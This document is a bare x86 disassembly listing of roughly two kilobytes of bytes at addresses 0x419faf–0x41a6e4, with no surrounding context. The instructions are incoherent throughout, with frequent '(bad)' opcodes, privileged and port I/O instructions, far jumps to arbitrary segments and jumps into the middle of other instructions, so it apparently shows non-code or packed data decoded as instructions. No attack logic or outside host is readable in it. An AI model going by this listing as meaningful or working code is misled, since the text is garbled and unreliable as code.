  419faf:	out    0x1f,al
  419fb1:	in     eax,dx
  419fb2:	dec    ebx
  419fb3:	gs iret 
  419fb5:	ud2    
  419fb7:	cs ret 
  419fb9:	jnp    0x419fe7
  419fbb:	mov    ecx,DWORD PTR [edx+ebp*1-0x77f260ea]
  419fc2:	fs mov esi,0xfba1604d
  419fc8:	sub    al,BYTE PTR [ecx+0x1235168b]
  419fce:	inc    ebx
  419fcf:	add    al,0xc1
  419fd1:	out    dx,eax
  419fd2:	xor    dl,bh
  419fd4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  419fd6:	fwait
  419fd7:	xchg   ecx,eax
  419fd8:	imul   ecx,DWORD PTR [edx],0xd81a1717
  419fde:	pop    edx
  419fdf:	(bad)  
  419fe0:	repnz mov WORD PTR [ebx],?
  419fe3:	push   es
  419fe4:	lidtd  [edi+0xdd66f8]
  419feb:	clc    
  419fec:	mov    cs,esp
  419fee:	retf   
  419fef:	fldcw  WORD PTR [eax+edi*4]
  419ff2:	cmp    al,0xa
  419ff4:	add    BYTE PTR [ecx],dh
  419ff6:	test   eax,0x3a29fbaa
  419ffb:	sbb    eax,ecx
  419ffd:	push   ss
  419ffe:	sub    esp,DWORD PTR [ecx]
  41a000:	fwait
  41a001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a002:	retf   
  41a003:	daa    
  41a004:	adc    BYTE PTR [edi-0x71c153b3],dh
  41a00a:	mov    bh,0x4f
  41a00c:	xchg   ebx,eax
  41a00d:	mov    ss,edx
  41a00f:	hlt    
  41a010:	xor    edi,DWORD PTR [eax+eiz*8-0x19f76a88]
  41a017:	dec    edi
  41a018:	test   BYTE PTR [esp+ebp*4+0x3b],0x6c
  41a01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a01e:	sub    eax,0xe87d1b0c
  41a023:	and    BYTE PTR [eax],ah
  41a025:	in     eax,dx
  41a026:	xchg   esi,eax
  41a027:	jo     0x41a03f
  41a029:	and    BYTE PTR [eax*1-0xbadbbef],0xd7
  41a031:	sub    BYTE PTR [ebp-0x5f791cf1],bh
  41a037:	outs   dx,DWORD PTR ss:[esi]
  41a039:	xchg   ebp,eax
  41a03a:	dec    edi
  41a03b:	fbstp  TBYTE PTR ss:[ebp+0x74]
  41a03f:	adc    DWORD PTR [edx-0x2],edi
  41a042:	and    edi,esi
  41a044:	inc    edi
  41a045:	mov    ds:0x660b50fc,eax
  41a04a:	ins    DWORD PTR es:[edi],dx
  41a04b:	xor    BYTE PTR [esi],dh
  41a04d:	fisubr DWORD PTR [eax-0x1f]
  41a050:	lahf   
  41a051:	push   eax
  41a052:	xor    ecx,ebp
  41a054:	es pop ds
  41a056:	leave  
  41a057:	dec    edx
  41a058:	or     ebx,DWORD PTR [ecx-0x34a8c7b7]
  41a05e:	xlat   BYTE PTR ds:[ebx]
  41a05f:	sbb    al,0x4b
  41a061:	mov    ds:0x59c6cdba,al
  41a066:	es retf 0xed9f
  41a06a:	and    al,0xe3
  41a06c:	and    bl,BYTE PTR ss:[eax+0x10]
  41a070:	jne    0x41a0e0
  41a072:	xchg   edx,eax
  41a073:	add    eax,0xf0d0409a
  41a078:	inc    esp
  41a079:	add    BYTE PTR [eax],bh
  41a07b:	inc    ebp
  41a07c:	push   ss
  41a07d:	xchg   ebp,eax
  41a07e:	rcl    BYTE PTR [edi-0x52],0x34
  41a082:	xor    BYTE PTR [ecx-0x2eaad888],0x5d
  41a089:	imul   BYTE PTR [edi+ebx*4+0x79]
  41a08d:	or     ch,al
  41a08f:	retf   
  41a090:	ret    
  41a091:	mov    dl,BYTE PTR [eax]
  41a093:	push   edx
  41a094:	mov    dl,0x90
  41a096:	aad    0x15
  41a098:	mov    BYTE PTR [esi-0x4d],al
  41a09b:	pop    ds
  41a09c:	mov    bh,0x51
  41a09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a09f:	in     al,0xa3
  41a0a1:	loopne 0x41a031
  41a0a3:	and    cl,bl
  41a0a5:	inc    esp
  41a0a6:	(bad)  
  41a0a7:	arpl   WORD PTR [ebx],cx
  41a0a9:	gs jecxz 0x41a0d3
  41a0ac:	push   cs
  41a0ad:	mov    ds:0xde27092,al
  41a0b2:	add    DWORD PTR [eax+esi*2-0x6f],esp
  41a0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0b7:	retf   
  41a0b8:	push   0x11
  41a0ba:	xchg   ebx,eax
  41a0bb:	or     eax,0xf0daf197
  41a0c0:	pop    eax
  41a0c1:	test   ah,ch
  41a0c3:	out    dx,al
  41a0c4:	xchg   ecx,eax
  41a0c5:	adc    eax,DWORD PTR [edi+0x2f]
  41a0c8:	xor    eax,DWORD PTR [eax]
  41a0ca:	push   0x71ca6e13
  41a0cf:	mov    dl,0x57
  41a0d1:	and    eax,0x7b85de2b
  41a0d6:	adc    ebp,DWORD PTR [eax]
  41a0d8:	pushf  
  41a0d9:	lea    ecx,[ebx]
  41a0db:	adc    dl,bh
  41a0dd:	fmul   st(7),st
  41a0df:	cs icebp 
  41a0e1:	add    edx,DWORD PTR [ebx-0x1c]
  41a0e4:	mov    al,0xaf
  41a0e6:	test   al,0xc7
  41a0e8:	test   al,0x80
  41a0ea:	add    al,BYTE PTR [bx+di+0x65]
  41a0ee:	xor    DWORD PTR [ebx-0x52],esi
  41a0f1:	cli    
  41a0f2:	cli    
  41a0f3:	je     0x41a127
  41a0f5:	sbb    DWORD PTR [eax+0x6e6c724c],edx
  41a0fb:	pushf  
  41a0fc:	mov    DWORD PTR [esi*8+0x5bad273],ecx
  41a103:	rol    BYTE PTR [eax-0x70],1
  41a106:	push   0x201b63ae
  41a10b:	push   0x609b90fa
  41a110:	jne    0x41a145
  41a112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a113:	push   ss
  41a114:	imul   eax,edx,0xffffff8e
  41a117:	iret   
  41a118:	aas    
  41a119:	jl     0x41a0dd
  41a11b:	cmp    eax,0x8237f1ef
  41a120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a121:	add    al,dh
  41a123:	retf   
  41a124:	loop   0x41a17f
  41a126:	fstp   QWORD PTR [ebp+0x72361131]
  41a12c:	ins    DWORD PTR es:[edi],dx
  41a12d:	pop    ss
  41a12e:	xchg   edx,eax
  41a12f:	aam    0x70
  41a131:	pop    edx
  41a132:	add    al,0xb2
  41a134:	jg     0x41a0d6
  41a136:	push   ecx
  41a137:	pop    esi
  41a138:	out    dx,eax
  41a139:	mov    ebx,0x159c2179
  41a13e:	mov    esp,DWORD PTR [edx-0x6d375d65]
  41a144:	(bad)  [ebp+0x3e]
  41a147:	dec    esi
  41a148:	loope  0x41a143
  41a14a:	in     al,dx
  41a14b:	jg     0x41a1a8
  41a14d:	fbstp  TBYTE PTR [ebx+0x5a]
  41a150:	adc    ch,BYTE PTR [esi+0x59]
  41a153:	and    ah,dl
  41a155:	call   0x826e44af
  41a15a:	repnz and al,0xc5
  41a15d:	jmp    0x41a149
  41a15f:	pop    edi
  41a160:	jne    0x41a1b2
  41a162:	jne    0x41a1d8
  41a164:	add    eax,0xf8006cdf
  41a169:	ror    BYTE PTR ds:0xd4fc0a9d,cl
  41a16f:	pop    ebp
  41a170:	(bad)
  41a174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a175:	out    dx,al
  41a176:	or     edx,DWORD PTR [eax+0x463e3f05]
  41a17c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a17d:	dec    edi
  41a17e:	retf   
  41a17f:	push   ebp
  41a180:	std    
  41a181:	loopne 0x41a152
  41a183:	sbb    DWORD PTR [edx],ecx
  41a185:	mov    al,ds:0x696e8017
  41a18a:	data16 xor BYTE PTR [eax-0x27],dl
  41a18e:	or     eax,0x3825644e
  41a193:	icebp  
  41a194:	add    ch,ah
  41a196:	sbb    cl,cl
  41a198:	add    ebx,DWORD PTR [ebx]
  41a19a:	popa   
  41a19b:	fwait
  41a19c:	dec    ebp
  41a19d:	mov    dh,0xf1
  41a19f:	push   edi
  41a1a0:	rol    BYTE PTR [eax-0x4c],0xc0
  41a1a4:	xchg   edx,eax
  41a1a5:	xor    al,0x4b
  41a1a7:	xor    al,0xd9
  41a1a9:	and    eax,DWORD PTR [eax-0x2ec64bee]
  41a1af:	mov    edx,0x1f0701cd
  41a1b4:	inc    edi
  41a1b5:	outs   dx,DWORD PTR ds:[esi]
  41a1b6:	jge    0x41a16e
  41a1b8:	pop    esp
  41a1b9:	inc    esp
  41a1ba:	pop    eax
  41a1bb:	sub    ebx,DWORD PTR [ebp-0x4684815f]
  41a1c1:	push   edi
  41a1c2:	bound  edx,QWORD PTR [ebx+0x5]
  41a1c5:	or     al,0x6a
  41a1c7:	sbb    esi,DWORD PTR [ecx]
  41a1c9:	sub    al,0xb
  41a1cb:	mov    bl,0x7c
  41a1cd:	fmul   QWORD PTR [eax+0x2]
  41a1d0:	retf   0xe808
  41a1d3:	adc    cl,BYTE PTR ds:[ecx+ebp*8-0x625b6e13]
  41a1db:	(bad)  
  41a1dc:	loopne 0x41a256
  41a1de:	jg     0x41a178
  41a1e0:	fwait
  41a1e1:	jnp    0x41a1b5
  41a1e3:	gs add al,0x12
  41a1e6:	fisttp WORD PTR [ebx]
  41a1e8:	shl    dl,cl
  41a1ea:	inc    ebp
  41a1eb:	repz scas eax,DWORD PTR es:[edi]
  41a1ed:	test   eax,0xf01c4427
  41a1f2:	mov    ebp,DWORD PTR [ebp+0x2d809455]
  41a1f8:	test   eax,0x33d2b7c2
  41a1fd:	rol    ah,cl
  41a1ff:	jb     0x41a1a4
  41a201:	fistp  WORD PTR [ecx-0x53]
  41a204:	ja     0x41a246
  41a206:	clc    
  41a207:	clc    
  41a208:	and    bl,BYTE PTR [edx-0x6a]
  41a20b:	xor    eax,0xb415e4eb
  41a210:	leave  
  41a211:	mov    bh,0xda
  41a213:	sub    DWORD PTR [ebp-0x180a2eea],edx
  41a219:	(bad)  
  41a21a:	shl    DWORD PTR [edx+esi*2-0x17],1
  41a21e:	aaa    
  41a21f:	pop    ss
  41a220:	pop    ss
  41a221:	ret    0x8b32
  41a224:	int    0xb5
  41a226:	stos   DWORD PTR es:[edi],eax
  41a227:	test   BYTE PTR [esi-0x7],al
  41a22a:	in     eax,dx
  41a22b:	fs xchg esp,eax
  41a22d:	or     BYTE PTR [ebx-0x4b],cl
  41a230:	and    eax,0x72e40253
  41a235:	(bad)  
  41a236:	dec    esp
  41a237:	test   BYTE PTR [esi],cl
  41a239:	(bad)  
  41a23a:	adc    ebp,esi
  41a23c:	mov    al,0x72
  41a23e:	mov    ss,WORD PTR [eax]
  41a240:	jb     0x41a20e
  41a242:	mul    DWORD PTR [ecx+edi*8]
  41a245:	push   ecx
  41a246:	jecxz  0x41a217
  41a248:	mov    al,ds:0xa4bf6d77
  41a24d:	dec    esi
  41a24e:	std    
  41a24f:	mov    ch,0xf7
  41a251:	xchg   esp,eax
  41a252:	xor    BYTE PTR fs:[ecx+0x75],bh
  41a256:	adc    bh,BYTE PTR [edi+0xabb48f3]
  41a25c:	inc    ecx
  41a25d:	xor    eax,0xe2a3f7c
  41a262:	or     DWORD PTR [eax],0x5
  41a265:	and    DWORD PTR [edx+edx*2-0x7c],edx
  41a269:	cli    
  41a26a:	popa   
  41a26b:	jbe    0x41a2cb
  41a26d:	jl     0x41a2be
  41a26f:	out    0x33,eax
  41a271:	jno    0x41a205
  41a273:	nop
  41a274:	popf   
  41a275:	sub    ebp,DWORD PTR [esi+0x4f]
  41a278:	cmp    ecx,DWORD PTR [edx+edx*2]
  41a27b:	(bad)  
  41a27c:	fidiv  DWORD PTR [eax+0x61]
  41a27f:	dec    ebp
  41a280:	out    0x82,eax
  41a282:	(bad)  
  41a283:	sbb    DWORD PTR ds:0xbed23ee7,edx
  41a289:	iret   
  41a28a:	xor    dl,bl
  41a28c:	div    dh
  41a28e:	mov    ds:0x8ddd2d99,al
  41a293:	std    
  41a294:	push   es
  41a295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a296:	inc    edi
  41a297:	int3   
  41a298:	push   ss
  41a299:	push   edx
  41a29a:	mov    dl,0xf
  41a29c:	test   DWORD PTR [edx-0x5f48e592],ebp
  41a2a2:	add    DWORD PTR [esi+0x2d66e900],0x33
  41a2a9:	cmp    ecx,edi
  41a2ab:	(bad)  
  41a2ac:	imul   esp,DWORD PTR [esi+0xd],0x3c5c0604
  41a2b3:	inc    esi
  41a2b4:	je     0x41a284
  41a2b6:	lods   eax,DWORD PTR ds:[esi]
  41a2b7:	xchg   esi,eax
  41a2b8:	and    DWORD PTR [ebp-0x6dc36a8a],0xffffffd7
  41a2bf:	and    DWORD PTR [edi-0x54],ebp
  41a2c2:	push   ecx
  41a2c3:	cmp    DWORD PTR [ebp-0x1f072d21],ecx
  41a2c9:	enter  0xf4b8,0x8d
  41a2cd:	jmp    FWORD PTR [edx-0x7b]
  41a2d0:	test   DWORD PTR [esi],eax
  41a2d2:	push   edi
  41a2d3:	pop    edx
  41a2d4:	mov    bh,0xdf
  41a2d6:	xor    ch,BYTE PTR [ebx]
  41a2d8:	arpl   dx,bx
  41a2da:	mov    dl,0x8
  41a2dc:	mov    dh,dl
  41a2de:	xor    bh,ch
  41a2e0:	sti    
  41a2e1:	test   eax,0xa9e59f14
  41a2e6:	sbb    bl,BYTE PTR [ecx-0x7d]
  41a2e9:	pop    esi
  41a2ea:	mov    ds:0x49f76f3f,eax
  41a2ef:	xchg   ecx,eax
  41a2f0:	and    al,0x8d
  41a2f2:	retf   0x66cf
  41a2f5:	stc    
  41a2f6:	mov    bh,0x1
  41a2f8:	xchg   BYTE PTR [edx+0x4e26a417],ch
  41a2fe:	test   BYTE PTR [ebp-0x46],ch
  41a301:	dec    esi
  41a302:	fisub  DWORD PTR [eax-0x7c1c68a7]
  41a308:	mov    dl,0x55
  41a30a:	adc    eax,0x1fc96ba9
  41a30f:	adc    cl,dh
  41a311:	cmp    DWORD PTR [edx+0x34],ebp
  41a314:	out    dx,al
  41a315:	outs   dx,BYTE PTR ds:[esi]
  41a316:	pop    es
  41a317:	(bad)  
  41a318:	aad    0x33
  41a31a:	push   cs
  41a31b:	mov    al,0x92
  41a31d:	retf   
  41a31e:	ror    edi,0x6b
  41a321:	loop   0x41a346
  41a323:	lods   eax,DWORD PTR ds:[esi]
  41a324:	adc    al,0x1b
  41a326:	ret    0x3e1b
  41a329:	(bad)  
  41a32a:	stc    
  41a32b:	mov    ch,0x4f
  41a32d:	imul   edi,DWORD PTR [eax+0x39],0x6f
  41a331:	dec    ebx
  41a332:	mov    edi,0x71d6ff05
  41a337:	jno    0x41a34b
  41a339:	push   ebp
  41a33a:	add    al,0x54
  41a33c:	sub    DWORD PTR [ecx+0x1405281d],esp
  41a342:	inc    ebx
  41a343:	iret   
  41a344:	and    ch,bl
  41a346:	adc    al,0xc
  41a348:	fbld   TBYTE PTR [ebx]
  41a34a:	aas    
  41a34b:	xchg   BYTE PTR [eax+0x50],ch
  41a34e:	lods   al,BYTE PTR ds:[esi]
  41a34f:	jne    0x41a371
  41a351:	and    eax,ecx
  41a353:	mov    ebp,0xf5b34232
  41a358:	fwait
  41a359:	adc    BYTE PTR [esi-0x5f],ch
  41a35c:	jno    0x41a397
  41a35e:	popa   
  41a35f:	xchg   esp,eax
  41a360:	hlt    
  41a361:	mov    eax,0xf32a03aa
  41a366:	adc    edx,DWORD PTR [edi]
  41a368:	add    BYTE PTR [edx],bh
  41a36a:	rol    DWORD PTR [ebp+0x24],0x80
  41a36e:	cmp    cl,BYTE PTR [edi+0x68]
  41a371:	(bad)
  41a376:	out    0x5c,al
  41a378:	add    eax,0xc82df8d
  41a37d:	cdq    
  41a37e:	jno    0x41a3b4
  41a380:	push   ebp
  41a381:	call   FWORD PTR ds:0x53e31a7b
  41a387:	mov    al,0x67
  41a389:	xor    dh,dl
  41a38b:	sub    BYTE PTR [eax],bl
  41a38d:	add    al,0x20
  41a38f:	aad    0xf8
  41a391:	push   ebx
  41a392:	ins    BYTE PTR es:[edi],dx
  41a393:	daa    
  41a394:	lods   eax,DWORD PTR ds:[esi]
  41a395:	ins    BYTE PTR es:[edi],dx
  41a396:	sar    DWORD PTR [edx-0x7a],cl
  41a399:	dec    ecx
  41a39a:	mov    dl,0x2e
  41a39c:	sahf   
  41a39d:	(bad)  
  41a39e:	sub    dl,ch
  41a3a0:	pop    ds
  41a3a1:	sub    DWORD PTR [eax+edi*4+0x74d550e7],eax
  41a3a8:	popf   
  41a3a9:	sub    DWORD PTR [eax],ecx
  41a3ab:	loopne 0x41a352
  41a3ad:	lahf   
  41a3ae:	(bad)  
  41a3af:	loop   0x41a3a3
  41a3b1:	sbb    al,0xd1
  41a3b3:	enter  0x7919,0x12
  41a3b7:	lahf   
  41a3b8:	dec    edi
  41a3b9:	inc    edx
  41a3ba:	jmp    0x32fb:0xd586ea84
  41a3c1:	fdivr  DWORD PTR [eax+0x63ec6e2]
  41a3c7:	mov    ebp,0x38d625a7
  41a3cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3cd:	dec    ebx
  41a3ce:	out    dx,al
  41a3cf:	pusha  
  41a3d0:	mov    ah,0x6c
  41a3d2:	out    0x24,eax
  41a3d4:	mov    ah,BYTE PTR ds:0x798ad607
  41a3da:	cdq    
  41a3db:	jge    0x41a399
  41a3dd:	mov    bl,dl
  41a3df:	jns    0x41a3d8
  41a3e1:	sbb    bh,bh
  41a3e3:	call   0x9077e884
  41a3e8:	cld    
  41a3e9:	out    dx,eax
  41a3ea:	lods   eax,DWORD PTR ds:[esi]
  41a3eb:	jp     0x41a45e
  41a3ed:	outs   dx,BYTE PTR ds:[esi]
  41a3ee:	test   al,0x58
  41a3f0:	jge    0x41a42e
  41a3f2:	mov    esi,0x7475b6f5
  41a3f7:	call   FWORD PTR ds:0x1a8b2634
  41a3fd:	jl     0x41a43d
  41a3ff:	jecxz  0x41a434
  41a401:	ss loopne 0x41a45d
  41a404:	mov    ebp,0x9c5dee0d
  41a409:	repnz cmp esp,DWORD PTR [ecx+esi*1+0x5bbc1687]
  41a411:	pop    ebp
  41a412:	les    ecx,FWORD PTR [ebx-0x9]
  41a415:	ins    DWORD PTR es:[edi],dx
  41a416:	and    ah,0xec
  41a419:	leave  
  41a41a:	aad    0xb2
  41a41c:	call   0xd5bd:0xff8db424
  41a423:	aas    
  41a424:	(bad)  
  41a425:	lds    esp,FWORD PTR [edx+0x2b]
  41a428:	mov    bl,BYTE PTR [edx+esi*2-0x77]
  41a42c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a42d:	push   ecx
  41a42e:	or     ch,bl
  41a430:	adc    al,0xc0
  41a432:	out    dx,al
  41a433:	sbb    eax,0xac33ae73
  41a438:	into   
  41a439:	out    dx,eax
  41a43a:	scas   eax,DWORD PTR es:[edi]
  41a43b:	mov    dh,0x89
  41a43d:	pushf  
  41a43e:	int    0x50
  41a440:	(bad)  
  41a441:	in     al,0x91
  41a443:	or     eax,0x9358b1f3
  41a448:	mov    cl,0xd9
  41a44a:	push   ecx
  41a44b:	push   ebx
  41a44c:	into   
  41a44d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a44e:	outs   dx,DWORD PTR ds:[esi]
  41a44f:	mov    esp,DWORD PTR [ebp+edx*2+0x76]
  41a453:	sub    BYTE PTR [eax+0xb73b8c6],ah
  41a459:	repnz inc ebx
  41a45b:	mov    ebp,0x81e5d3c4
  41a460:	shr    DWORD PTR [ecx+ebp*4],1
  41a463:	jne    0x41a417
  41a465:	inc    edi
  41a466:	ss test al,0x77
  41a469:	pushf  
  41a46a:	in     al,0x2c
  41a46c:	cmp    DWORD PTR [ecx],ebp
  41a46e:	and    esp,0x2ab3cf56
  41a474:	cld    
  41a475:	cld    
  41a476:	and    al,0x34
  41a478:	hlt    
  41a479:	pop    ebx
  41a47a:	pusha  
  41a47b:	das    
  41a47c:	fild   WORD PTR [edi+edx*8]
  41a47f:	push   cs
  41a480:	xor    eax,0xf5773943
  41a485:	leave  
  41a486:	icebp  
  41a487:	xor    dh,BYTE PTR [eax-0x45bafcd2]
  41a48d:	icebp  
  41a48e:	jp     0x41a43c
  41a490:	inc    eax
  41a491:	cmc    
  41a492:	adc    eax,0x33611e6b
  41a497:	outs   dx,BYTE PTR ds:[esi]
  41a498:	push   edi
  41a49a:	in     eax,dx
  41a49b:	push   eax
  41a49c:	scas   eax,DWORD PTR es:[edi]
  41a49d:	push   eax
  41a49e:	inc    ebp
  41a49f:	fwait
  41a4a0:	lea    eax,[eax]
  41a4a2:	(bad)  
  41a4a3:	mov    ebp,0x18830211
  41a4a8:	add    BYTE PTR [edx-0x1ede0ee8],bh
  41a4ae:	pop    ebp
  41a4af:	lock add al,0x9e
  41a4b2:	shr    DWORD PTR [ecx+edi*4-0x28afd324],0x76
  41a4ba:	fs cwde 
  41a4bc:	sub    ecx,ebp
  41a4be:	addr16 add edi,esp
  41a4c1:	cld    
  41a4c2:	mov    ebp,0xca931ecf
  41a4c7:	or     DWORD PTR [edx],ecx
  41a4c9:	push   ebx
  41a4ca:	shr    DWORD PTR [edx+edi*1+0x37],0xf5
  41a4cf:	pushf  
  41a4d0:	jmp    0xc97b9a6a
  41a4d5:	xchg   BYTE PTR [esi+eiz*4],ah
  41a4d8:	sub    eax,0xe9c1c7e5
  41a4dd:	fidivr DWORD PTR [eax]
  41a4df:	add    edi,DWORD PTR [eax-0x2b]
  41a4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4e3:	push   eax
  41a4e4:	scas   eax,DWORD PTR es:[edi]
  41a4e5:	xlat   BYTE PTR ds:[ebx]
  41a4e6:	ret    
  41a4e7:	iret   
  41a4e8:	mov    eax,ecx
  41a4ea:	jp     0x41a482
  41a4ec:	hlt    
  41a4ed:	or     BYTE PTR [esi-0x27],cl
  41a4f0:	ds and ebp,esp
  41a4f3:	int3   
  41a4f4:	sub    al,0xbb
  41a4f6:	adc    al,0x3f
  41a4f8:	lea    ebp,[edx]
  41a4fa:	push   0x53f22b0e
  41a4ff:	jmp    0x9f73d045
  41a504:	jne    0x41a57c
  41a506:	push   es
  41a507:	scas   eax,DWORD PTR es:[edi]
  41a508:	dec    eax
  41a509:	add    eax,0xd22665b0
  41a50e:	push   0xa3b188a
  41a513:	mov    ah,BYTE PTR [esp+esi*8]
  41a516:	xrelease mov DWORD PTR [eax],0x879f7e2c
  41a51d:	sub    eax,DWORD PTR [edx-0x354c5c57]
  41a523:	adc    DWORD PTR [ebx-0x34ff48b9],edi
  41a529:	adc    eax,0x7f58d878
  41a52e:	(bad)  
  41a530:	clc    
  41a531:	scas   al,BYTE PTR es:[edi]
  41a532:	ins    BYTE PTR es:[edi],dx
  41a533:	or     al,0x1e
  41a535:	push   esp
  41a536:	sbb    ebp,DWORD PTR [eax-0x1282f719]
  41a53c:	xchg   edx,eax
  41a53d:	xchg   ecx,eax
  41a53e:	xchg   esp,eax
  41a53f:	and    ch,BYTE PTR [edi-0x13]
  41a542:	lods   eax,DWORD PTR ds:[esi]
  41a543:	loope  0x41a56d
  41a545:	push   edx
  41a546:	cmp    ch,cl
  41a548:	fisttp WORD PTR [ecx-0x58]
  41a54b:	out    dx,eax
  41a54c:	dec    esp
  41a54d:	mov    es,WORD PTR [ebp-0x7f]
  41a550:	out    dx,eax
  41a551:	fidivr WORD PTR [edx]
  41a553:	cmp    cl,BYTE PTR [esi+0x52]
  41a556:	adc    eax,DWORD PTR [edi-0x45]
  41a559:	(bad)  
  41a55a:	sbb    ecx,eax
  41a55c:	cmp    edx,DWORD PTR [edx]
  41a55e:	pushw  ds
  41a560:	imul   DWORD PTR [ebx]
  41a562:	sar    DWORD PTR ss:[edi],cl
  41a565:	pop    ss
  41a566:	cmp    eax,0x2c01b313
  41a56b:	mov    esp,fs
  41a56d:	mov    BYTE PTR [esi-0x2d],ah
  41a570:	inc    esi
  41a571:	mov    edx,0x9a73dfe5
  41a576:	icebp  
  41a577:	sub    eax,esp
  41a579:	cmc    
  41a57a:	add    DWORD PTR [edx-0x28d3fd6d],edi
  41a580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a581:	xchg   esp,eax
  41a582:	mov    bh,0xb7
  41a584:	inc    ebp
  41a585:	pop    es
  41a586:	(bad)  
  41a587:	iret   
  41a588:	mov    esi,0x7122a3c7
  41a58d:	fisub  DWORD PTR [edi+0x16739d06]
  41a593:	das    
  41a594:	pop    ss
  41a595:	dec    ecx
  41a596:	jmp    0x31d92b2
  41a59b:	test   BYTE PTR [edi+eiz*8+0x119a2c71],0x19
  41a5a3:	xor    eax,DWORD PTR [edi]
  41a5a5:	dec    eax
  41a5a6:	repz inc edx
  41a5a8:	or     BYTE PTR [ebx+0x739feaa6],al
  41a5ae:	jp     0x41a611
  41a5b0:	xor    DWORD PTR [edx],0xc84946f7
  41a5b6:	mov    esi,0x9fc2b296
  41a5bb:	out    dx,eax
  41a5bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5bd:	scas   al,BYTE PTR es:[edi]
  41a5be:	mov    cl,0x2d
  41a5c0:	sub    DWORD PTR [ecx+0x7f9051b6],esi
  41a5c6:	sahf   
  41a5c7:	mov    ch,0xe2
  41a5c9:	int3   
  41a5ca:	enter  0xc9fe,0x3e
  41a5ce:	jnp    0x41a562
  41a5d0:	xchg   BYTE PTR [ebp-0x28],bh
  41a5d3:	repnz mov edi,0xd81a7f6b
  41a5d9:	sbb    eax,0xd7a22d00
  41a5de:	pusha  
  41a5df:	mov    ds:0x44346bce,al
  41a5e4:	dec    ecx
  41a5e5:	mov    edx,DWORD PTR [edi-0x7052b3fe]
  41a5eb:	mov    DWORD PTR [ebx+0x62774e65],esi
  41a5f1:	rcr    BYTE PTR [edi],0xe0
  41a5f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5f5:	into   
  41a5f6:	mov    ebp,0x794c0b9c
  41a5fb:	bound  ecx,QWORD PTR [esi+0x5d9eb197]
  41a601:	ret    
  41a602:	popf   
  41a603:	push   esi
  41a604:	popw   ds
  41a606:	or     dl,BYTE PTR [eax]
  41a608:	aad    0x43
  41a60a:	aad    0x31
  41a60c:	das    
  41a60d:	add    ebp,esp
  41a60f:	cmp    ch,ah
  41a611:	jo     0x41a5d7
  41a613:	mov    ds:0x3541cb7,al
  41a618:	sbb    al,0x13
  41a61a:	inc    ebp
  41a61b:	shl    esi,cl
  41a61d:	fwait
  41a61e:	pop    eax
  41a61f:	xchg   ecx,eax
  41a620:	pop    eax
  41a621:	retf   0x18ce
  41a624:	into   
  41a625:	sub    al,0x12
  41a627:	push   ecx
  41a628:	and    BYTE PTR gs:[edx+0x51],dl
  41a62c:	xor    al,0x2c
  41a62e:	scas   al,BYTE PTR es:[edi]
  41a62f:	cmp    eax,0x20238c8b
  41a634:	ret    
  41a635:	pop    ss
  41a636:	pop    ds
  41a637:	lods   eax,DWORD PTR ds:[esi]
  41a638:	idiv   BYTE PTR [edi]
  41a63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a63b:	sbb    esi,0xffffffa2
  41a63e:	enter  0x8ab2,0xb8
  41a642:	int3   
  41a643:	nop
  41a644:	inc    BYTE PTR [eax]
  41a646:	test   eax,0x3f0b0ef5
  41a64b:	repz test eax,0x2dbec76c
  41a651:	bound  edx,QWORD PTR [esp+edx*8+0x1011d9c0]
  41a658:	push   ds
  41a659:	adc    DWORD PTR [ebx-0x1f],edi
  41a65c:	mov    BYTE PTR [edx+0x584e7e04],0xb0
  41a663:	mov    gs,WORD PTR [edi-0x51]
  41a666:	push   edi
  41a667:	leave  
  41a668:	adc    BYTE PTR [eax+esi*8],bl
  41a66b:	inc    ecx
  41a66c:	xor    BYTE PTR [ebp-0x13],cl
  41a66f:	or     DWORD PTR [ebx-0x4712ad09],ecx
  41a675:	pop    ebx
  41a676:	fwait
  41a677:	ds lahf 
  41a679:	xchg   esi,eax
  41a67a:	adc    eax,0x41baf6ff
  41a67f:	mov    dh,0xbd
  41a681:	in     al,dx
  41a682:	pop    ds
  41a683:	mov    bh,0xfb
  41a685:	dec    ebx
  41a686:	fs loope 0x41a6d1
  41a689:	ins    BYTE PTR es:[edi],dx
  41a68a:	adc    eax,0x4af7fbf4
  41a68f:	mov    eax,gs
  41a691:	popf   
  41a692:	push   eax
  41a693:	imul   edx,DWORD PTR es:[bx+si+0x67],0xffffffab
  41a699:	push   edi
  41a69a:	mov    esi,edi
  41a69c:	imul   ebp,DWORD PTR [ecx+0x6a750188],0x3e4aad95
  41a6a6:	in     eax,dx
  41a6a7:	jge    0x41a6fc
  41a6a9:	test   BYTE PTR [ebx-0x66],0xa5
  41a6ad:	test   DWORD PTR [ebp-0x47eb682],esi
  41a6b3:	mov    ebp,0xcc1b5f48
  41a6b8:	arpl   WORD PTR [ebx+0x1],si
  41a6bb:	ss xchg ecx,eax
  41a6bd:	arpl   WORD PTR [edx-0x1b9f017],cx
  41a6c3:	out    0x11,eax
  41a6c5:	scas   eax,DWORD PTR es:[edi]
  41a6c6:	inc    esp
  41a6c7:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a6c9:	aaa    
  41a6ca:	jg     0x41a6d7
  41a6cc:	adc    DWORD PTR [ecx+0x4e7f99db],eax
  41a6d2:	jmp    0x8660:0x3dab7fcb
  41a6d9:	test   BYTE PTR [esi+0x45bbf571],dh
  41a6df:	in     eax,dx
  41a6e0:	in     eax,dx
  41a6e1:	xor    bh,BYTE PTR [eax]
  41a6e3:	dec    ebp
  41a6e4:	in     eax,dx
